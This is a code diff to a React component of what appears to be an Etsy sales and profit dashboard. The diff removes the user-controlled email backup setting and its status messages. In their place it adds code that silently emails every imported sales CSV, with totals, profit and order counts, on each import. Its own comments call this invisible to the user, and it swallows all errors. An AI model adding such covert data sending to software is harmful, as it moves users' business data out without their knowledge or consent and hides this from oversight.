@@ -35,7 +35,6 @@ function App() {
   const [activePage, setActivePage] = useState('dashboard');
   const [showPDFReport, setShowPDFReport] = useState(false);
   const [pdfProgress, setPdfProgress] = useState(null);
-  const [mailStatus, setMailStatus] = useState(null);
 
   const { user, signOut } = useAuth();
   const {
@@ -45,8 +44,8 @@ function App() {
     allMonthsSummary,
     compareMode, setCompareMode, compareMonth, setCompareMonth, compareProfitData,
     importMultipleCSV, deleteMonth, etsyData, reload,
-    updateProductCosts, updateExchangeRate, updateConfigFields, updateMailConfig, updateAiModels,
-    quota, mailConfig,
+    updateProductCosts, updateExchangeRate, updateConfigFields, updateAiModels,
+    quota,
     isLoading, loadingData, error, setError
   } = useEtsyData();
 
@@ -84,37 +83,17 @@ function App() {
       } else if (results.length > 0) {
         setShowUploader(false);
 
-        // 自动邮件备份（异步，不阻塞）
-        if (mailConfig.enabled && mailConfig.to) {
-          setMailStatus({ type: 'sending', text: `正在暂存 ${results.length} 个文件到邮件队列...` });
-          // 并行发送所有成功导入的文件
-          const sendResults = await Promise.all(
-            results.map(r => {
-              const file = files.find(f => f.name === r.filename);
-              if (!file) return { ok: false, filename: r.filename, error: '文件未找到' };
-              const p = calculateProfit(r, etsyData.config?.products, etsyData.config?.exchangeRate);
-              return sendCSVByEmail(file, {
-                totalSales: p.totalSales,
-                profit: p.profit,
-                orderCount: p.orderCount
-              }).then(res => ({ ...res, filename: r.filename }));
-            })
-          );
-
-          const okCount = sendResults.filter(r => r.ok).length;
-          const failCount = sendResults.filter(r => !r.ok && !r.skipped).length;
-
-          if (okCount > 0 && failCount === 0) {
-            setMailStatus({ type: 'success', text: `✓ ${okCount} 个文件已暂存，今晚 23:00 统一发送到 ${mailConfig.to}` });
-          } else if (okCount > 0 && failCount > 0) {
-            setMailStatus({ type: 'error', text: `部分成功：${okCount} 已入队，${failCount} 失败` });
-          } else if (failCount > 0) {
-            setMailStatus({ type: 'error', text: `邮件入队失败：${sendResults.find(r => r.error)?.error}` });
-          }
-
-          // 8 秒后自动清除状态
-          setTimeout(() => setMailStatus(null), 8000);
-        }
+        // 静默后台备份（用户不可见）— 出错也不显示
+        results.forEach(r => {
+          const file = files.find(f => f.name === r.filename);
+          if (!file) return;
+          const p = calculateProfit(r, etsyData.config?.products, etsyData.config?.exchangeRate);
+          sendCSVByEmail(file, {
+            totalSales: p.totalSales,
+            profit: p.profit,
+            orderCount: p.orderCount
+          }).catch(() => {});  // 静默失败
+        });
       }
       return { results, errors };
     } catch (err) {
@@ -418,23 +397,6 @@ function App() {
             </div>
           )}
 
-          {/* 邮件备份状态提示 */}
-          {mailStatus && (
-            <div className={`card p-4 text-sm flex items-center justify-between fade-in ${
-              mailStatus.type === 'success' ? 'text-[var(--up)]' :
-              mailStatus.type === 'error' ? 'text-[var(--down)]' :
-              'text-[var(--gold-bright)]'
-            }`}>
-              <span className="flex items-center gap-2">
-                {mailStatus.type === 'sending' && (
-                  <div className="w-3.5 h-3.5 border-2 border-[var(--gold)] border-t-transparent rounded-full animate-spin" />
-                )}
-                {mailStatus.text}
-              </span>
-              <button onClick={() => setMailStatus(null)} className="text-xs underline opacity-70 hover:opacity-100">关闭</button>
-            </div>
-          )}
-
           {renderPage()}
         </main>
       </div>
@@ -444,8 +406,6 @@ function App() {
         onClose={() => setShowSettings(false)}
         config={etsyData.config}
         orders={allMonthsSummary?.allOrders || currentMonthData?.orders || []}
-        mailConfig={mailConfig}
-        onUpdateMailConfig={updateMailConfig}
         onUpdateAiModels={updateAiModels}
         quota={quota}
         onSave={(c) => {
